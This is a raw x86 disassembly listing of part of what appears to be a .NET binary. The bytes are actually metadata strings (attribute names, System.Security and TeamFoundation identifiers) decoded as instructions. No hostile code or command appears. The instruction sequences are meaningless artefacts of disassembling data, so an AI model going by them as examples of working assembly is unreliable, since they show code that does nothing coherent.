  40a3e3:	bound  esi,QWORD PTR [ebp+0x74]
  40a3e6:	add    BYTE PTR gs:[ecx+0x6c],ah
  40a3ea:	ins    BYTE PTR es:[edi],dx
  40a3eb:	outs   dx,DWORD PTR ds:[esi]
  40a3ec:	ja     0x40a43e
  40a3ee:	gs jb  0x40a45e
  40a3f1:	imul   esi,DWORD PTR [ebx+0x73],0x6e6f69
  40a3f8:	fs outs dx,BYTE PTR gs:[esi]
  40a3fb:	jns    0x40a44d
  40a3fd:	gs jb  0x40a46d
  40a400:	imul   esi,DWORD PTR [ebx+0x73],0x6e6f69
  40a407:	outs   dx,DWORD PTR ds:[esi]
  40a408:	imul   esp,DWORD PTR [eax+eax*1+0x73],0x65767265
  40a410:	jb     0x40a412
  40a412:	jbe    0x40a475
  40a414:	ins    BYTE PTR es:[edi],dx
  40a415:	jne    0x40a47c
  40a417:	add    BYTE PTR [ebx+0x79],dl
  40a41a:	jae    0x40a490
  40a41c:	gs ins DWORD PTR es:[edi],dx
  40a41e:	cs push edx
  40a420:	jne    0x40a490
  40a422:	je     0x40a48d
  40a424:	ins    DWORD PTR es:[edi],dx
  40a425:	gs cs push esi
  40a428:	gs jb  0x40a49e
  40a42b:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  40a432:	push   esp
  40a433:	popa   
  40a434:	jb     0x40a49d
  40a436:	gs je  0x40a47f
  40a439:	jb     0x40a49c
  40a43b:	ins    DWORD PTR es:[edi],dx
  40a43c:	gs ja  0x40a4ae
  40a43f:	jb     0x40a4ac
  40a441:	inc    ecx
  40a442:	je     0x40a4b8
  40a444:	jb     0x40a4af
  40a446:	bound  esi,QWORD PTR [ebp+0x74]
  40a449:	add    BYTE PTR gs:[ebx+0x6f],al
  40a44d:	ins    DWORD PTR es:[edi],dx
  40a44e:	push   esi
  40a44f:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  40a456:	je     0x40a4cc
  40a458:	jb     0x40a4c3
  40a45a:	bound  esi,QWORD PTR [ebp+0x74]
  40a45d:	add    BYTE PTR gs:[ebx+0x4c],al
  40a461:	push   ebx
  40a462:	inc    ebx
  40a463:	outs   dx,DWORD PTR ds:[esi]
  40a464:	ins    DWORD PTR es:[edi],dx
  40a465:	jo     0x40a4d3
  40a467:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  40a46e:	jb     0x40a4d9
  40a470:	bound  esi,QWORD PTR [ebp+0x74]
  40a473:	add    BYTE PTR gs:[ebx+0x79],dl
  40a477:	jae    0x40a4ed
  40a479:	gs ins DWORD PTR es:[edi],dx
  40a47b:	cs push edx
  40a47d:	gs data16 ins BYTE PTR es:[edi],dx
  40a480:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a485:	outs   dx,BYTE PTR ds:[esi]
  40a486:	add    BYTE PTR [ecx+0x73],al
  40a489:	jae    0x40a4f0
  40a48b:	ins    DWORD PTR es:[edi],dx
  40a48c:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  40a490:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  40a498:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a49f:	jae    0x40a514
  40a4a1:	gs ins DWORD PTR es:[edi],dx
  40a4a3:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40a4a7:	gs jae 0x40a50d
  40a4aa:	jb     0x40a515
  40a4ac:	jo     0x40a522
  40a4ae:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a4b5:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a4bc:	jae    0x40a531
  40a4be:	gs ins DWORD PTR es:[edi],dx
  40a4c0:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40a4c4:	gs popaw 
  40a4c7:	jne    0x40a535
  40a4c9:	je     0x40a50c
  40a4cb:	ins    BYTE PTR es:[edi],dx
  40a4cc:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40a4d3:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a4da:	jae    0x40a54f
  40a4dc:	gs ins DWORD PTR es:[edi],dx
  40a4de:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40a4e2:	outs   dx,DWORD PTR ds:[esi]
  40a4e3:	ins    DWORD PTR es:[edi],dx
  40a4e4:	jo     0x40a547
  40a4e6:	outs   dx,BYTE PTR ds:[esi]
  40a4e7:	jns    0x40a52a
  40a4e9:	je     0x40a55f
  40a4eb:	jb     0x40a556
  40a4ed:	bound  esi,QWORD PTR [ebp+0x74]
  40a4f0:	add    BYTE PTR gs:[ecx+0x73],al
  40a4f4:	jae    0x40a55b
  40a4f6:	ins    DWORD PTR es:[edi],dx
  40a4f7:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  40a4fb:	jb     0x40a56c
  40a4fd:	fs jne 0x40a563
  40a500:	je     0x40a543
  40a502:	je     0x40a578
  40a504:	jb     0x40a56f
  40a506:	bound  esi,QWORD PTR [ebp+0x74]
  40a509:	add    BYTE PTR gs:[ecx+0x73],al
  40a50d:	jae    0x40a574
  40a50f:	ins    DWORD PTR es:[edi],dx
  40a510:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40a514:	outs   dx,DWORD PTR ds:[esi]
  40a515:	jo     0x40a590
  40a517:	jb     0x40a582
  40a519:	addr16 push 0x74744174
  40a51f:	jb     0x40a58a
  40a521:	bound  esi,QWORD PTR [ebp+0x74]
  40a524:	add    BYTE PTR gs:[ecx+0x73],al
  40a528:	jae    0x40a58f
  40a52a:	ins    DWORD PTR es:[edi],dx
  40a52b:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40a52f:	gs jb  0x40a5a5
  40a532:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a539:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a540:	jae    0x40a5b5
  40a542:	gs ins DWORD PTR es:[edi],dx
  40a544:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  40a548:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  40a550:	outs   dx,DWORD PTR ds:[esi]
  40a551:	outs   dx,BYTE PTR ds:[esi]
  40a552:	inc    ecx
  40a553:	je     0x40a5c9
  40a555:	jb     0x40a5c0
  40a557:	bound  esi,QWORD PTR [ebp+0x74]
  40a55a:	add    BYTE PTR gs:[ecx+0x73],al
  40a55e:	jae    0x40a5c5
  40a560:	ins    DWORD PTR es:[edi],dx
  40a561:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a565:	outs   dx,BYTE PTR ds:[esi]
  40a566:	outs   dx,WORD PTR ds:[esi]
  40a568:	jb     0x40a5d7
  40a56a:	popa   
  40a56b:	je     0x40a5d6
  40a56d:	outs   dx,DWORD PTR ds:[esi]
  40a56e:	outs   dx,BYTE PTR ds:[esi]
  40a56f:	popa   
  40a570:	ins    BYTE PTR es:[edi],dx
  40a571:	push   esi
  40a572:	gs jb  0x40a5e8
  40a575:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a57c:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  40a583:	popa   
  40a584:	je     0x40a5eb
  40a586:	ins    BYTE PTR es:[edi],dx
  40a587:	ins    BYTE PTR es:[edi],dx
  40a588:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  40a590:	popa   
  40a591:	arpl   WORD PTR [esi+edx*2+0x65],si
  40a595:	jb     0x40a60a
  40a597:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a59e:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  40a5a5:	gs jne 0x40a61c
  40a5a8:	jb     0x40a60b
  40a5aa:	ins    BYTE PTR es:[edi],dx
  40a5ab:	push   edx
  40a5ac:	gs jae 0x40a61e
  40a5af:	jne    0x40a623
  40a5b1:	arpl   WORD PTR [ebp+0x73],sp
  40a5b4:	dec    esp
  40a5b5:	popa   
  40a5b6:	outs   dx,BYTE PTR ds:[esi]
  40a5b7:	addr16 jne 0x40a61b
  40a5ba:	addr16 gs inc ecx
  40a5bd:	je     0x40a633
  40a5bf:	jb     0x40a62a
  40a5c1:	bound  esi,QWORD PTR [ebp+0x74]
  40a5c4:	add    BYTE PTR gs:[ecx+0x73],al
  40a5c8:	jae    0x40a62f
  40a5ca:	ins    DWORD PTR es:[edi],dx
  40a5cb:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40a5cf:	gs ins BYTE PTR es:[edi],dx
  40a5d1:	popa   
  40a5d2:	jns    0x40a627
  40a5d4:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  40a5db:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a5e2:	jae    0x40a657
  40a5e4:	gs ins DWORD PTR es:[edi],dx
  40a5e6:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  40a5ea:	gs jns 0x40a633
  40a5ed:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  40a5f5:	bound  esi,QWORD PTR [ebp+0x74]
  40a5f8:	add    BYTE PTR gs:[ecx+0x73],al
  40a5fc:	jae    0x40a663
  40a5fe:	ins    DWORD PTR es:[edi],dx
  40a5ff:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  40a603:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  40a60a:	gs dec ebx
  40a60c:	gs jns 0x40a650
  40a60f:	je     0x40a685
  40a611:	jb     0x40a67c
  40a613:	bound  esi,QWORD PTR [ebp+0x74]
  40a616:	add    BYTE PTR gs:[ebx+0x79],dl
  40a61a:	jae    0x40a690
  40a61c:	gs ins DWORD PTR es:[edi],dx
  40a61e:	cs push edx
  40a620:	jne    0x40a690
  40a622:	je     0x40a68d
  40a624:	ins    DWORD PTR es:[edi],dx
  40a625:	gs cs inc ebx
  40a628:	outs   dx,DWORD PTR ds:[esi]
  40a629:	ins    DWORD PTR es:[edi],dx
  40a62a:	jo     0x40a695
  40a62c:	ins    BYTE PTR es:[edi],dx
  40a62d:	gs jb  0x40a683
  40a630:	gs jb  0x40a6a9
  40a633:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  40a63a:	outs   dx,BYTE PTR ds:[esi]
  40a63b:	je     0x40a6a6
  40a63d:	ins    DWORD PTR es:[edi],dx
  40a63e:	gs inc ebx
  40a640:	outs   dx,DWORD PTR ds:[esi]
  40a641:	ins    DWORD PTR es:[edi],dx
  40a642:	jo     0x40a6a5
  40a644:	je     0x40a6af
  40a646:	bound  ebp,QWORD PTR [ecx+0x6c]
  40a649:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  40a651:	bound  esi,QWORD PTR [ebp+0x74]
  40a654:	add    BYTE PTR gs:[ebx+0x79],dl
  40a658:	jae    0x40a6ce
  40a65a:	gs ins DWORD PTR es:[edi],dx
  40a65c:	cs push ebx
  40a65e:	arpl   WORD PTR gs:[ebp+0x72],si
  40a662:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  40a66a:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  40a671:	add    BYTE PTR [ebp+0x6e],al
  40a674:	jbe    0x40a6df
  40a676:	jb     0x40a6e7
  40a678:	outs   dx,BYTE PTR ds:[esi]
  40a679:	ins    DWORD PTR es:[edi],dx
  40a67a:	outs   dx,BYTE PTR gs:[esi]
  40a67c:	je     0x40a6ce
  40a67e:	gs jb  0x40a6ee
  40a681:	imul   esi,DWORD PTR [ebx+0x73],0x416e6f69
  40a688:	je     0x40a6fe
  40a68a:	jb     0x40a6f5
  40a68c:	bound  esi,QWORD PTR [ebp+0x74]
  40a68f:	add    BYTE PTR gs:[ebx+0x65],dl
  40a693:	arpl   WORD PTR [ebp+0x72],si
  40a696:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  40a69e:	outs   dx,BYTE PTR ds:[esi]
  40a69f:	add    BYTE PTR [ebx+0x79],dl
  40a6a2:	jae    0x40a718
  40a6a4:	gs ins DWORD PTR es:[edi],dx
  40a6a6:	cs inc esp
  40a6a8:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  40a6af:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  40a6b6:	jne    0x40a71f
  40a6b8:	addr16 popa 
  40a6ba:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40a6be:	je     0x40a734
  40a6c0:	jb     0x40a72b
  40a6c2:	bound  esi,QWORD PTR [ebp+0x74]
  40a6c5:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40a6ca:	jne    0x40a733
  40a6cc:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  40a6d4:	jae    0x40a6d6
  40a6d6:	inc    ebx
  40a6d7:	outs   dx,DWORD PTR ds:[esi]
  40a6d8:	ins    DWORD PTR es:[edi],dx
  40a6d9:	jo     0x40a744
  40a6db:	ins    BYTE PTR es:[edi],dx
  40a6dc:	popa   
  40a6dd:	je     0x40a748
  40a6df:	outs   dx,DWORD PTR ds:[esi]
  40a6e0:	outs   dx,BYTE PTR ds:[esi]
  40a6e1:	push   edx
  40a6e2:	gs ins BYTE PTR es:[edi],dx
  40a6e4:	popa   
  40a6e5:	js     0x40a748
  40a6e7:	je     0x40a752
  40a6e9:	outs   dx,DWORD PTR ds:[esi]
  40a6ea:	outs   dx,BYTE PTR ds:[esi]
  40a6eb:	jae    0x40a72e
  40a6ed:	je     0x40a763
  40a6ef:	jb     0x40a75a
  40a6f1:	bound  esi,QWORD PTR [ebp+0x74]
  40a6f4:	add    BYTE PTR gs:[esi+eax*2+0x53],dl
  40a6f9:	push   ebx
  40a6fa:	arpl   WORD PTR gs:[ebp+0x72],si
  40a6fe:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x736e6f43
  40a706:	outs   dx,DWORD PTR ds:[esi]
  40a707:	ins    BYTE PTR es:[edi],dx
  40a708:	add    BYTE PTR gs:[edi+0x72],dl
  40a70c:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  40a714:	push   edi
  40a715:	jb     0x40a780
  40a717:	je     0x40a77e
  40a719:	add    BYTE PTR [edi+0x65],ah
  40a71c:	je     0x40a77d
  40a71e:	inc    esp
  40a71f:	gs jae 0x40a785
  40a722:	jb     0x40a78d
  40a724:	jo     0x40a79a
  40a726:	outs   dx,DWORD PTR ds:[esi]
  40a727:	jb     0x40a729
  40a729:	addr16 gs je 0x40a78c
  40a72d:	dec    ecx
  40a72e:	fs outs dx,BYTE PTR gs:[esi]
  40a731:	je     0x40a79c
  40a733:	imul   sp,WORD PTR [ebp+0x72],0x4d00
  40a739:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a740:	je     0x40a770
  40a742:	push   esp
  40a743:	gs popa 
  40a745:	ins    DWORD PTR es:[edi],dx
  40a746:	inc    esi
  40a747:	outs   dx,DWORD PTR ds:[esi]
  40a748:	jne    0x40a7b8
  40a74a:	fs popa 
  40a74c:	je     0x40a7b7
  40a74e:	outs   dx,DWORD PTR ds:[esi]
  40a74f:	outs   dx,BYTE PTR ds:[esi]
  40a750:	add    BYTE PTR [ecx+0x64],cl
  40a753:	outs   dx,BYTE PTR gs:[esi]
  40a755:	je     0x40a7c0
  40a757:	je     0x40a7d2
  40a759:	inc    ecx
  40a75a:	je     0x40a7d0
  40a75c:	jb     0x40a7c7
  40a75e:	bound  esi,QWORD PTR [ebp+0x74]
  40a761:	gs push esp
  40a763:	popa   
  40a764:	addr16 jae 0x40a767
  40a767:	inc    esp
  40a768:	imul   esi,DWORD PTR [ebx+0x74],0x75676e69
  40a76f:	imul   esi,DWORD PTR [ebx+0x68],0x614e6465
  40a776:	ins    DWORD PTR es:[edi],dx
  40a777:	add    BYTE PTR gs:[ebx+0x74],dl
  40a77b:	jb     0x40a7e6
  40a77d:	outs   dx,BYTE PTR ds:[esi]
  40a77e:	add    BYTE PTR [di+0x6d],al
  40a782:	jo     0x40a7f8
  40a784:	jns    0x40a786
  40a786:	inc    edi
  40a787:	gs je  0x40a7cb
  40a78a:	je     0x40a800
  40a78c:	jb     0x40a7f7
  40a78e:	bound  esi,QWORD PTR [ebp+0x74]
  40a791:	add    BYTE PTR gs:[edi+0x65],ah
  40a795:	je     0x40a7f6
  40a797:	dec    ecx
  40a798:	jae    0x40a7dd
  40a79a:	outs   dx,DWORD PTR ds:[esi]
  40a79b:	outs   dx,BYTE PTR ds:[esi]
  40a79c:	je     0x40a7ff
  40a79e:	imul   ebp,DWORD PTR [esi+0x65],0x64490072
  40a7a5:	outs   dx,BYTE PTR gs:[esi]
  40a7a7:	je     0x40a812
  40a7a9:	je     0x40a824
  40a7ab:	add    BYTE PTR [edi+0x65],al
  40a7ae:	je     0x40a804
  40a7b0:	jns    0x40a822
  40a7b2:	add    BYTE PTR gs:[ecx+0x64],cl
  40a7b6:	outs   dx,BYTE PTR gs:[esi]
  40a7b8:	je     0x40a823
  40a7ba:	je     0x40a835
  40a7bc:	dec    eax
  40a7bd:	gs ins BYTE PTR es:[edi],dx
  40a7bf:	jo     0x40a826
  40a7c1:	jb     0x40a7c3
  40a7c3:	inc    edi
  40a7c4:	jb     0x40a835
  40a7c6:	jne    0x40a838
  40a7c8:	push   ebx
  40a7c9:	jo     0x40a830
  40a7cb:	arpl   WORD PTR [ecx+0x61],bp
  40a7ce:	ins    BYTE PTR es:[edi],dx
  40a7cf:	push   esp
  40a7d0:	jns    0x40a842
  40a7d2:	add    BYTE PTR gs:[edi+0x65],al
  40a7d6:	je     0x40a81f
  40a7d8:	jb     0x40a849
  40a7da:	jne    0x40a84c
  40a7dc:	push   ebx
  40a7dd:	jo     0x40a844
  40a7df:	arpl   WORD PTR [ecx+0x61],bp
  40a7e2:	ins    BYTE PTR es:[edi],dx
  40a7e3:	push   esp
  40a7e4:	jns    0x40a856
  40a7e6:	add    BYTE PTR gs:[ecx+0x70],al
  40a7ea:	jo     0x40a858
  40a7ec:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a7f3:	inc    edi
  40a7f4:	jb     0x40a865
  40a7f6:	jne    0x40a868
  40a7f8:	push   ebx
  40a7f9:	jo     0x40a860
  40a7fb:	arpl   WORD PTR [ecx+0x61],bp
  40a7fe:	ins    BYTE PTR es:[edi],dx
  40a7ff:	push   esp
  40a800:	jns    0x40a872
  40a802:	add    BYTE PTR gs:[edi+ebp*2+0x6d],al
  40a807:	popa   
  40a808:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  40a80f:	dec    ecx
  40a810:	fs outs dx,BYTE PTR gs:[esi]
  40a813:	je     0x40a87e
  40a815:	je     0x40a890
  40a817:	inc    esp
  40a818:	outs   dx,DWORD PTR ds:[esi]
  40a819:	ins    DWORD PTR es:[edi],dx
  40a81a:	popa   
  40a81b:	imul   ebp,DWORD PTR [esi+0x53],0x65706f63
  40a822:	add    BYTE PTR [ebx+0x74],dl
  40a825:	jb     0x40a890
  40a827:	outs   dx,BYTE PTR ds:[esi]
  40a828:	addr16 inc ebx
  40a82a:	outs   dx,DWORD PTR ds:[esi]
  40a82b:	ins    DWORD PTR es:[edi],dx
  40a82c:	jo     0x40a88f
  40a82e:	jb     0x40a899
  40a830:	jae    0x40a8a1
  40a832:	outs   dx,BYTE PTR ds:[esi]
  40a833:	add    BYTE PTR [ebp+0x71],al
  40a836:	jne    0x40a899
  40a838:	ins    BYTE PTR es:[edi],dx
  40a839:	jae    0x40a83b
  40a83b:	push   ebx
  40a83c:	arpl   WORD PTR [edi+0x70],bp
  40a83f:	gs dec esi
  40a841:	popa   
  40a842:	ins    DWORD PTR es:[edi],dx
  40a843:	add    BYTE PTR gs:[ecx+0x73],cl
  40a847:	dec    esi
  40a848:	jne    0x40a8b6
  40a84a:	ins    BYTE PTR es:[edi],dx
  40a84b:	dec    edi
  40a84c:	jb     0x40a893
  40a84e:	ins    DWORD PTR es:[edi],dx
  40a84f:	jo     0x40a8c5
  40a851:	jns    0x40a853
  40a853:	inc    edi
  40a854:	gs je  0x40a89b
  40a857:	outs   dx,DWORD PTR ds:[esi]
  40a858:	ins    DWORD PTR es:[edi],dx
  40a859:	popa   
  40a85a:	imul   ebp,DWORD PTR [esi+0x55],0x4e726573
  40a861:	popa   
  40a862:	ins    DWORD PTR es:[edi],dx
  40a863:	add    BYTE PTR gs:[edi+0x65],ah
  40a867:	je     0x40a8c8
  40a869:	dec    esp
  40a86a:	outs   dx,BYTE PTR gs:[esi]
  40a86c:	addr16 je 0x40a8d7
  40a86f:	add    BYTE PTR [edi+0x65],ah
  40a872:	je     0x40a8d3
  40a874:	inc    ebx
  40a875:	jne    0x40a8e9
  40a877:	jb     0x40a8de
  40a879:	outs   dx,BYTE PTR ds:[esi]
  40a87a:	je     0x40a8bf
  40a87c:	jne    0x40a8ea
  40a87e:	je     0x40a8f5
  40a880:	jb     0x40a8e7
  40a882:	add    BYTE PTR [esi+0x75],cl
  40a885:	ins    DWORD PTR es:[edi],dx
  40a886:	bound  esp,QWORD PTR [ebp+0x72]
  40a889:	inc    esi
  40a88a:	outs   dx,DWORD PTR ds:[esi]
  40a88b:	jb     0x40a8fa
  40a88d:	popa   
  40a88e:	je     0x40a8d9
  40a890:	outs   dx,BYTE PTR ds:[esi]
  40a891:	outs   dx,WORD PTR ds:[esi]
  40a893:	add    BYTE PTR [edi+0x65],ah
  40a896:	je     0x40a8f7
  40a898:	dec    ecx
  40a899:	outs   dx,BYTE PTR ds:[esi]
  40a89a:	jbe    0x40a8fd
  40a89c:	jb     0x40a907
  40a89e:	popa   
  40a89f:	outs   dx,BYTE PTR ds:[esi]
  40a8a0:	je     0x40a8eb
  40a8a2:	outs   dx,BYTE PTR ds:[esi]
  40a8a3:	outs   dx,WORD PTR ds:[esi]
  40a8a5:	add    BYTE PTR [ecx+0x6e],cl
  40a8a8:	je     0x40a8dd
  40a8aa:	xor    al,BYTE PTR [eax]
  40a8ac:	dec    ecx
  40a8ad:	inc    esi
  40a8ae:	outs   dx,DWORD PTR ds:[esi]
  40a8af:	jb     0x40a91e
  40a8b1:	popa   
  40a8b2:	je     0x40a904
  40a8b4:	jb     0x40a925
  40a8b6:	jbe    0x40a921
  40a8b8:	fs gs jb 0x40a8bc
  40a8bc:	push   esp
  40a8bd:	outs   dx,DWORD PTR ds:[esi]
  40a8be:	push   ebx
  40a8bf:	je     0x40a933
  40a8c1:	imul   ebp,DWORD PTR [esi+0x67],0x726f4600
  40a8c8:	ins    DWORD PTR es:[edi],dx
  40a8c9:	popa   
  40a8ca:	je     0x40a8cc
  40a8cc:	push   edx
  40a8cd:	gs popa 
  40a8cf:	fs dec ecx
  40a8d1:	fs outs dx,BYTE PTR gs:[esi]
  40a8d4:	je     0x40a93f
  40a8d6:	je     0x40a941
  40a8d8:	gs jae 0x40a8db
  40a8db:	push   ebx
  40a8dc:	je     0x40a950
  40a8de:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  40a8e5:	popa   
  40a8e6:	jb     0x40a94d
  40a8e8:	jb     0x40a8ea
  40a8ea:	addr16 gs je 0x40a94d
  40a8ee:	dec    edi
  40a8ef:	jb     0x40a955
  40a8f1:	imul   ebp,DWORD PTR [esi+0x61],0x6e67496c
  40a8f8:	outs   dx,DWORD PTR ds:[esi]
  40a8f9:	jb     0x40a960
  40a8fb:	inc    ebx
  40a8fc:	popa   
  40a8fd:	jae    0x40a964
  40a8ff:	add    BYTE PTR [ecx+0x64],cl
  40a902:	outs   dx,BYTE PTR gs:[esi]
  40a904:	je     0x40a96f
  40a906:	je     0x40a981
  40a908:	inc    ebx
  40a909:	outs   dx,DWORD PTR ds:[esi]
  40a90a:	outs   dx,BYTE PTR ds:[esi]
  40a90b:	jae    0x40a981
  40a90d:	popa   
  40a90e:	outs   dx,BYTE PTR ds:[esi]
  40a90f:	je     0x40a984
  40a911:	add    BYTE PTR [ebp+eiz*2+0x61],dl
  40a915:	ins    DWORD PTR es:[edi],dx
  40a916:	inc    esi
  40a917:	outs   dx,DWORD PTR ds:[esi]
  40a918:	jne    0x40a988
  40a91a:	fs popa 
  40a91c:	je     0x40a987
  40a91e:	outs   dx,DWORD PTR ds:[esi]
  40a91f:	outs   dx,BYTE PTR ds:[esi]
  40a920:	push   esp
  40a921:	jns    0x40a993
  40a923:	add    BYTE PTR gs:[ecx+0x63],al
  40a927:	arpl   WORD PTR [edi+0x75],bp
  40a92a:	outs   dx,BYTE PTR ds:[esi]
  40a92b:	je     0x40a97b
  40a92d:	popa   
  40a92e:	ins    DWORD PTR es:[edi],dx
  40a92f:	add    BYTE PTR gs:[edi+0x70],ch
  40a933:	pop    edi
  40a934:	inc    ebp
  40a935:	jno    0x40a9ac
  40a937:	popa   
  40a938:	ins    BYTE PTR es:[edi],dx
  40a939:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x6d697254
  40a941:	add    BYTE PTR [ebx+0x68],al
  40a944:	popa   
  40a945:	jb     0x40a947
  40a947:	inc    ebx
  40a948:	outs   dx,DWORD PTR ds:[esi]
  40a949:	outs   dx,BYTE PTR ds:[esi]
  40a94a:	arpl   WORD PTR [ecx+0x74],sp
  40a94d:	add    BYTE PTR [edx+0x65],dl
  40a950:	popa   
  40a951:	fs dec ecx
  40a953:	fs outs dx,BYTE PTR gs:[esi]
  40a956:	je     0x40a9c1
  40a958:	je     0x40a9d3
  40a95a:	add    BYTE PTR [ebx+0x79],dl
  40a95d:	jae    0x40a9d3
  40a95f:	gs ins DWORD PTR es:[edi],dx
  40a961:	cs inc ebx
  40a963:	outs   dx,DWORD PTR ds:[esi]
  40a964:	ins    BYTE PTR es:[edi],dx
  40a965:	ins    BYTE PTR es:[edi],dx
  40a966:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a96b:	outs   dx,BYTE PTR ds:[esi]
  40a96c:	jae    0x40a99c
  40a96e:	dec    edi
  40a96f:	bound  ebp,QWORD PTR [edx+0x65]
  40a972:	arpl   WORD PTR [ebp+ecx*2+0x6f],si
  40a976:	fs gs ins BYTE PTR es:[edi],dx
  40a979:	add    BYTE PTR [edx+0x65],dl
  40a97c:	popa   
  40a97d:	fs dec edi
  40a97f:	outs   dx,BYTE PTR ds:[esi]
  40a980:	ins    BYTE PTR es:[edi],dx
  40a981:	jns    0x40a9c6
  40a983:	outs   dx,DWORD PTR ds:[esi]
  40a984:	ins    BYTE PTR es:[edi],dx
  40a985:	ins    BYTE PTR es:[edi],dx
  40a986:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a98b:	outs   dx,BYTE PTR ds:[esi]
  40a98c:	pusha  
  40a98d:	xor    DWORD PTR [eax],eax
  40a98f:	inc    ecx
  40a990:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40a994:	outs   dx,BYTE PTR ds:[esi]
  40a995:	inc    esp
  40a996:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  40a99d:	outs   dx,DWORD PTR ds:[esi]
  40a99e:	outs   dx,BYTE PTR ds:[esi]
  40a99f:	add    BYTE PTR [edi+0x65],ah
  40a9a2:	je     0x40aa03
  40a9a4:	inc    ecx
  40a9a5:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40a9a9:	outs   dx,BYTE PTR ds:[esi]
  40a9aa:	jae    0x40a9ac
  40a9ac:	dec    ecx
  40a9ad:	inc    ebp
  40a9ae:	outs   dx,BYTE PTR ds:[esi]
  40a9af:	jne    0x40aa1e
  40a9b1:	gs jb  0x40aa15
  40a9b4:	je     0x40aa25
  40a9b6:	jb     0x40aa18
  40a9b8:	xor    DWORD PTR [eax],eax
  40a9ba:	inc    edi
  40a9bb:	gs je  0x40aa03
  40a9be:	outs   dx,BYTE PTR ds:[esi]
  40a9bf:	jne    0x40aa2e
  40a9c1:	gs jb  0x40aa25
  40a9c4:	je     0x40aa35
  40a9c6:	jb     0x40a9c8
  40a9c8:	addr16 gs je 0x40aa2b
  40a9cc:	inc    ebx
  40a9cd:	jne    0x40aa41
  40a9cf:	jb     0x40aa36
  40a9d1:	outs   dx,BYTE PTR ds:[esi]
  40a9d2:	je     0x40a9d4
  40a9d4:	addr16 gs je 0x40aa37
  40a9d8:	inc    esp
  40a9d9:	outs   dx,BYTE PTR gs:[esi]
  40a9db:	jns    0x40a9dd
  40a9dd:	addr16 gs je 0x40aa40
  40a9e1:	inc    edx
  40a9e2:	imul   esi,DWORD PTR [eax+eax*1+0x67],0x415f7465
  40a9ea:	ins    BYTE PTR es:[edi],dx
  40a9eb:	ins    BYTE PTR es:[edi],dx
  40a9ec:	outs   dx,DWORD PTR ds:[esi]
  40a9ed:	ja     0x40a9ef
  40a9ef:	addr16 gs je 0x40aa52
  40a9f3:	dec    esi
  40a9f4:	popa   
  40a9f5:	ins    DWORD PTR es:[edi],dx
  40a9f6:	add    BYTE PTR gs:[eax+0x61],dl
  40a9fa:	fs push edx
  40a9fc:	imul   esp,DWORD PTR [edi+0x68],0x75530074
  40aa03:	bound  esi,QWORD PTR [ebx+0x74]
  40aa06:	jb     0x40aa71
  40aa08:	outs   dx,BYTE PTR ds:[esi]
  40aa09:	add    BYTE PTR [bp+di+0x79],dl
  40aa0d:	jae    0x40aa83
  40aa0f:	gs ins DWORD PTR es:[edi],dx
  40aa11:	cs inc ebx
  40aa13:	outs   dx,DWORD PTR ds:[esi]
  40aa14:	ins    BYTE PTR es:[edi],dx
  40aa15:	ins    BYTE PTR es:[edi],dx
  40aa16:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40aa1b:	outs   dx,BYTE PTR ds:[esi]
  40aa1c:	jae    0x40aa1e
  40aa1e:	dec    ecx
  40aa1f:	inc    ebp
  40aa20:	outs   dx,BYTE PTR ds:[esi]
  40aa21:	jne    0x40aa90
  40aa23:	gs jb  0x40aa87
